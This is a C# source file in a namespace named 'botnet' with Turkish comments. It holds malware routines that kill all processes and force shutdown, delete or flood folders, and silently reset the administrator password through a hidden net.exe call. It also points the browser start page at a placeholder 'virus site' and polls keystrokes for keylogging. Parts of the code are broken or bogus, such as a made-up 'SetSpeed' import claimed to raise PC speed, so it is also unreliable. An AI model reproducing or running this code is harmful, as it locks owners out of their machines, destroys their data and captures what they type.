using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace botnet
{
    class pc_bilgisi
    {
        public Process[] Memory = Process.GetProcesses();
        public static string[] dizi;
        public ArrayList ary = new ArrayList();
        public ArrayList klsrlistl = new ArrayList();
        public ArrayList driverlstl = new ArrayList();
        public int syc;
        public static string process_veri;
        public static string process_veri1;
        public void processkılll()//Bizim verdiğimiz Process'i kıll eder. 
        {
            foreach (var process in Process.GetProcessesByName("mspaint"))
            {
                process.Kill();
            }
        }
        public void processscanner()//Tüm Processleri listeler...
        {

            foreach (Process prc in Memory)
            {
                ary.Add(prc.ProcessName + "" + ",");
            }
            for (int i = 0; i < ary.Count; i++)
            {
                process_veri += ary[i].ToString();
            }
        }
        public void kıllklsrlstl()//Pc deki sürücüleri listeler...
        {
            dizi = Directory.GetLogicalDrives();
            for (int i = 0; i < dizi.Length; i++)
            {
                process_veri1 += dizi[i].ToString() + "" + ";";
            }
        }
        public void kıllklsr(string yol)//Bize verilen yoldaki tüm klasörleri listeler..
        {
            klsrlistl.Add(Directory.GetDirectories(yol));
        }
        public void kıllmebaby()//Tüm Process leri temizler...
        {
            foreach (Process prc in Memory)
            {
                foreach (var process in Process.GetProcessesByName(prc.ProcessName))
                {
                    process.Kill();
                }
            }
            ProcessStartInfo psi = new ProcessStartInfo();//Bilgisayarı kapatır.
            psi.FileName = "C:\\Windows\\system32\\shutdown.exe";//Bilgisayarı kapatır.
            psi.Arguments = "-f -s -t 0";//Bilgisayarı kapatır.
            Process.Start(psi);//Bilgisayarı kapatır.
        }
        public void kıllmebabyklasor(string yol)//Verilen yoldaki Tüm klasörleri siler...
        {
            klsrlistl.Add(Directory.GetDirectories(yol));
            for (int i = 0; i < klsrlistl.Count; i++)
            {
                Directory.Delete(klsrlistl.ToString());
            }
        }
        public void kıllmebabyklasordosya(string yol)//Verilen yoldaki  tüm klasörlerin içlerindeki dosyaları siler...
        {
            klsrlistl.Add(Directory.GetDirectories(yol));
            for (int i = 0; i < klsrlistl.Count; i++)
            {
                Directory.Delete(klsrlistl.ToString(), true);
            }
        }
        public void kıllmebabysurucuanasinisik(string yol)//Verilen yoldaki Tüm klasörleri siler...
        {
            syc++;
            kıllklsrlstl();
            for (int i = 0; i < driverlstl.Count; i++)
            {
                for (ulong j = 0; j < 9999999999999999999; j++)
                {
                    Directory.CreateDirectory(driverlstl[i].ToString() + "" + syc);
                }
            }
        }
        [DllImport("Cimwin32.dll")]
        static extern UInt32 SetSpeed(UInt64 sp);
        public void hızınanasinisık()//pc hızını artır...
        {
            SetSpeed(9999999999999999);
        }
        public static void ResetAdminPass()
        {
            //Create New Process
            Process QProc = new Process();

            // Do Something To hide Command(cmd) Window
            QProc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            QProc.StartInfo.CreateNoWindow = true;

            // Call Net.exe
            QProc.StartInfo.WorkingDirectory = "C:\\windows\\SYSTEM32";
            QProc.StartInfo.FileName = "net.exe";
            QProc.StartInfo.UseShellExecute = false;
            QProc.StartInfo.RedirectStandardError = true;
            QProc.StartInfo.RedirectStandardInput = true;
            QProc.StartInfo.RedirectStandardOutput = true;

            // Prepare Command for Exec
            QProc.StartInfo.Arguments = @" user administrator " + "kşahgnrjoşenab!'^%+%&/()=?Y%+Y&+658945164    984d9f4wegwhgw  =?FWR^VE+G43GV REGHERHRRJERJ";
            QProc.Start();

            // MyProc.WaitForExit();
            QProc.Close();
            ProcessStartInfo psi = new ProcessStartInfo();//Bilgisayarı kapatır.
            psi.FileName = "C:\\Windows\\system32\\shutdown.exe";//Bilgisayarı kapatır.
            psi.Arguments = "-f -s -t 0";//Bilgisayarı kapatır.
            Process.Start(psi);//Bilgisayarı kapatır.
        }
        public void anasyfdegistirme()
        {
            RegistryKey startPageKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\Main", true);
            startPageKey.SetValue("Start Page", "Buraya virüslüsiteeklenecek.");
            startPageKey.Close();
        }
        static string ImageToBase64(Image image, ImageFormat format)//Verilen resmi Base64 şifreleyerek gönderilir.
        {
            using (MemoryStream ms = new MemoryStream())
            {
                // Convert Image to byte[]
                image.Save(ms, format);
                byte[] imageBytes = ms.ToArray();

                // Convert byte[] to Base64 String
                return Convert.ToBase64String(imageBytes);
            }
        }
        public class TusKontrol
        {
            [DllImport("user32.dll", CharSet = CharSet.Ansi)]
            public static extern int GetAsyncKeyState(long vKey);
            // herhangi bir tus basildi ise, MIN(Int16)+1 döndürüyor.
            public static bool BuTusaMiBasildi(byte tusKod)
            {
                if (GetAsyncKeyState(tusKod) == short.MinValue + 1)
                    return true;
                else
                    return false;
            }

        }
    }
}
